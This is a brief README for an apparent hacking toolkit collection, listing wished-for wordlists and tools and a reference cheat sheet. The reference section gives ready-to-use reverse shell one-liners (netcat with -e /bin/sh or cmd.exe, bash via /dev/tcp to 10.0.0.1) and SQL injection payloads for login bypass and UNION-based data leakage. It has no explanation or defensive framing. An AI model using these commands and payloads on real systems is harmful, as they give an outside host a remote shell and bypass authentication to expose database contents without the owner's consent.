Library of GNU Exploitation
===========================

This is a collection of unix-like utilities particularly suited
for creative problem solving (H A C K I N G).


Wishlist
--------
* Additional wordlists from Kali
* (Corrected) rockyou list from Kali
  [Matching SHA256 16035fea7742cb0561c513de1d946eda5716d7de294e6c732449740096686173]
* Docs on hydra?
* Docs on sqlmap?
* Build of stegsolve (Java program)


Reference
---------
nc 10.0.0.1 1234 -e /bin/sh # Netcat reverse shell (Linux)
nc 10.0.0.1 1234 -e cmd.exe # Netcat reverse shell (Windows)
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # Bash reverse shell
' OR 1=1-- # SQL inject (pass)
' OR 1=1 UNION SELECT x,y,z FROM table-- # SQL inject (leak)
